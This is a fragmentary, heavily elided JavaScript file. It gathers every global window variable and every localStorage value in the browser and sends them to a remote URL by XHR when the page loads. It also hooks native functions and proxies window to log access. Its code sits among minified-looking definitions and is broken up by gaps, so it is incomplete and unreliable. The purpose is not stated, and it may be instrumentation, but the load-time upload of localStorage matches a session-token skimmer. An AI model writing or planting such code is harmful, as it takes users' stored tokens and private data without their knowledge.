  ...
  */
  ...
  function collectData() {
    ...
    for (const prop in window) {
      ...
      if (window.seenVars && window.seenVars.includes(prop)) continue;
      const value = window[prop];
      const type = typeof value;
      windowData[prop] = {
        type: type,
        value: type === "function" ? 'n/a' : value
      };
    }
    for (const prop in localStorage) {
      const value = localStorage[prop];
      const type = typeof value;
      localStorageData[prop] = {
        type: type,
        value: type === "function" ? 'n/a' : value
      };
    }
  ...
  function sendData(url, data) {
    ...
    xhr.onreadystatechange = () => onreadystatechangeHandler(xhr);
  ...
  function handleLoadEvent() {
    ...
    if (Object.keys(data.windowData).length > 0 || Object.keys(data.localStorageData).length > 0) {
      sendData(url, data);
    }
  }
  var Fl = function (a) {
  ...
  var globVarCollector = new Proxy(window, {
    get: function (target, propKey) {
      console.log('Global Variable Accessed: ' + propKey);
      return Reflect.get(target, propKey);
    }
  });

  // Capture function invokations with jsHook
  ...
  window.jsHook = {
    hooks: {},
    hook: function (lib, func, callback) {
      let orig = window[lib][func];
      window.jsHook.hooks[func] = orig;
      window[lib][func] = function () {
  ...
  window.jsHook.hook('Math', 'random', result => {
    console.log(`Math.random() invoked: result = ${result}`);
  });
  var BF = function () {
      return !1;
    },
